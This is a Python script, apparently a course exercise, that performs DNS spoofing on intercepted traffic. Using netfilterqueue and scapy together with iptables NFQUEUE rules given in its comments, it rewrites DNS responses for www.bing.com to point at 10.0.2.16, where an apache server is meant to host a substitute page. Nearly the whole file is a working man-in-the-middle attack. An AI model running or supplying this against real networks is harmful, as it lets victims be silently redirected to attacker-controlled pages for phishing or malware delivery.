#!/usr/bin/env python

##################################################
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# when we check our own machine, instead of FORWARD, use OUTPUT and then INPUT
# make sure to delete the iptables by: iptables --flush
##################################################

##################################################
#start apache server by: service apache2 start
#path to index file: /var/www/html
##################################################

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #get_payload = show the content of the packet
    #scapy.IP is to convert the normal packet to scapy packet so we can manipulate it
    if scapy_packet.haslayer(scapy.DNSRR):     #DNSRR = DNS Response (Resource) Record, DNSRQ = DNS Request (Question) Record
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16") # we can see this field by adding the "show" command
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1  #sometimes there are more than one answers, so we want it to be 1 to match what we send
            #we want scapy to modify the checksum and packets lengh to fit the modified answer
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()